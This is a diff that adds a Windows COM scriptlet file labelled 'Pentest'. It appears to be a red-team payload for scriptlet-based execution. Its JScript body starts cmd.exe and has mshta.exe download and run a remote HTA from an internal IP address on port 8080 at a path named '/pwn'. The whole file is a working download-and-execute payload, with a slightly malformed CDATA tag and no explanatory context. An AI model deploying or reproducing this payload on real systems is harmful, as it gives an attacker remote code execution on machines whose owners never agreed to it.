@@ -1,0 +1,12 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration
+progid="Pentest"
+classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
+<script language="JScript">
+![CDATA[
+var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c mshta.exe http://172.16.144.101:8080/pwn");
+]]>
+</script>
+</registration>
+</scriptlet>
